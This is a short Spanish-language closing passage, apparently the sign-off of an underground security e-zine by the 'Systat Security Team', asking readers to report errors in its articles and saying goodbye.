haciendo un esfuerzo por  dar algo decente al under de habla española, 
por lo que si alguno de  ustedes encontro un error en algun  articulo,  
que  nos  disculpe  y  por  favor  nos  haga  saber  de el error  para  
corregirlo. 
 
Entonces...hasta la proxima. 
 
 
						Systat Security Team.



EOF
